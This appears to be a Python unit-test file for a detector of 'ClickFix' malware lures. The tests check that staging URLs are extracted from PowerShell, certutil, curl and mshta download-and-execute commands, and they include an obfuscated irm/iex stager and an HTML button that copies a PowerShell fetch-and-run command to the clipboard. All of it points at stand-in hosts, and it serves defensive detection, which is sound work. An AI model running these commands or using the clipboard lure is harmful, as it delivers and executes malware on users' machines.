import unittest
from core.decoder import PayloadDecoder
from utils.defang import defang_url, defang_domain, defang_ip

class TestClickFixTracker(unittest.TestCase):

    def test_powershell_decoder_plain_and_quoted(self):
        samples = [
            ("irm https://malware-test.com/payload.ps1 | iex", "https://malware-test.com/payload.ps1"),
            ("irm 'https://malware-test.com/single.ps1' | iex", "https://malware-test.com/single.ps1"),
            ("Invoke-WebRequest -Uri https://malware-test.com/unquoted.exe -OutFile test.exe", "https://malware-test.com/unquoted.exe"),
            ("Invoke-WebRequest -Uri \"https://malware-test.com/double.exe\" -OutFile test.exe", "https://malware-test.com/double.exe"),
            ("(New-Object Net.WebClient).DownloadString('https://malware-test.com/webclient.ps1')", "https://malware-test.com/webclient.ps1"),
            ("certutil -urlcache -split -f https://malware-test.com/certutil.exe c.exe", "https://malware-test.com/certutil.exe"),
            ("curl.exe -s https://malware-test.com/curl.exe -o c.exe", "https://malware-test.com/curl.exe")
        ]
        for cmd, expected_url in samples:
            urls = PayloadDecoder.decode_powershell(cmd)
            self.assertIn(expected_url, urls, f"Failed to extract {expected_url} from {cmd}")

    def test_powershell_string_concatenation_and_formatting(self):
        cmd = "irm (('{0}{1}' -f 'h','ttps://')+('deobf-c2.org')+'/stager')"
        urls = PayloadDecoder.decode_powershell(cmd)
        self.assertIn("https://deobf-c2.org/stager", urls)

    def test_mshta_activex_dropper(self):
        cmd = """
        mshta "javascript:var x=new ActiveXObject('MSXML2.XMLHTTP');x.open('GET','https://cdn-evil.net/stager.exe',false);x.send();"
        """
        res = PayloadDecoder.decode_mshta(cmd)
        self.assertTrue(res["is_mshta"])
        self.assertIn("https://cdn-evil.net/stager.exe", res["staging_urls"])

    def test_clipboard_injection_generic(self):
        dom = """
        <html>
        <button onclick="copyPayload()">Fix Audio</button>
        <script>
        function copyPayload() {
            navigator.clipboard.writeText('powershell -Command "irm https://clipboard-c2.live/run.ps1 | iex"');
        }
        </script>
        </html>
        """
        res = PayloadDecoder.decode_cfmd_captcha(dom)
        self.assertTrue(res["is_cfmd"])
        self.assertIn("https://clipboard-c2.live/run.ps1", res["staging_urls"])

    def test_b64_url_and_fp_filter(self):
        # Valid malware base64 url
        b64_valid = "aHR0cHM6Ly9tYWx3YXJlLXRlc3QuY29tL3BheWxvYWQ="
        urls = PayloadDecoder.decode_b64_urls(b64_valid)
        self.assertIn("https://malware-test.com/payload", urls)

        # False positive XML / Adobe metadata
        b64_fp = "aHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLw=="
        urls_fp = PayloadDecoder.decode_b64_urls(b64_fp)
        self.assertEqual(len(urls_fp), 0)

    def test_defanging(self):
        self.assertEqual(defang_domain("malware.com"), "malware[.]com")
        self.assertEqual(defang_ip("1.2.3.4"), "1.2.3[.]4")
        self.assertEqual(defang_url("https://c2.com/test"), "hxxps://c2[.]com/test")

if __name__ == "__main__":
    unittest.main()
